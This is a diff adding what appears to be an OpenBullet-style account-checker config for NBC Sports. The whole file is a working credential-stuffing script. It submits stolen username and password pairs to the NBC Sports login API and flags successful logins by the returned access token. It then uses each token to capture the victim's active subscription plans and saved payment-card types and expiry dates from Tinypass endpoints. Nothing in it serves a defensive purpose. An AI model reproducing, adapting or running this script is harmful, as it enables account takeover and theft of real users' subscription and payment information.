@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "NBC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-12T13:49:18.6915244-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://pmauth.nbcsports.com/id/api/v1/identity/login/token?aid=Je5wPuCjpI&lang=en_US" 
+  CONTENT "{\"login\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "That combination of email and password is not recognized" 
+    KEY "reset your password" 
+    KEY "Captcha verification is required" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+PARSE "<SOURCE>" LR "\"access_token\" : \"" "\"" -> VAR "TOK" 
+
+REQUEST GET "https://buy.tinypass.com/checkout/myaccount/libraryLoadList?aid=Je5wPuCjpI" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: buy.tinypass.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Ng-Request: 1" 
+  HEADER "userToken: <TOK>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "userProvider: piano_id" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+
+PARSE "<SOURCE>" LR "activeLibrary\":[" "]" -> VAR "1" 
+
+PARSE "<1>" LR "resourceName\":\"" "\"" Recursive=TRUE -> VAR "PLAN" 
+
+PARSE "<1>" LR "expirationIsoDate\":\"" "T" Recursive=TRUE -> VAR "EXP" 
+
+PARSE "<SOURCE>" LR "expired\":" "," Recursive=TRUE -> VAR "EXPIRED" 
+
+FUNCTION Constant "<PLAN[*]> - <EXP[*]> - <EXPIRED[*]>" -> VAR "PLANS" 
+
+UTILITY List "PLANS" RemoveValues Contains "true" -> VAR "ass" 
+
+UTILITY List "ass" RemoveValues Contains "NULL" -> VAR "ass" 
+
+FUNCTION Replace " - false" "" "<ass>" -> CAP "PLANS" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<PLANS>" NotEqualTo "[]" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<PLANS>" EqualTo "[]" 
+
+REQUEST GET "https://buy.tinypass.com/checkout/myaccount/walletLoadList?aid=Je5wPuCjpI" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Host: buy.tinypass.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Ng-Request: 1" 
+  HEADER "userToken: <TOK>" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "userProvider: piano_id" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+
+PARSE "<SOURCE>" LR "\"paymentType\":\"" "\"" Recursive=TRUE -> VAR "paymentType" 
+
+PARSE "<SOURCE>" LR "expiration\":\"" "\"" Recursive=TRUE -> VAR "expir" 
+
+PARSE "<SOURCE>" LR "expired\":" "," Recursive=TRUE -> VAR "EXPIRED" 
+
+FUNCTION Constant "<paymentType[*]> - <expir[*]> - <EXPIRED[*]>" -> VAR "CARDS" 
+
+UTILITY List "CARDS" RemoveValues Contains "true" -> VAR "CARDS" 
+
+FUNCTION Replace " - false" "" "<CARDS>" -> CAP "CARDS" 
+
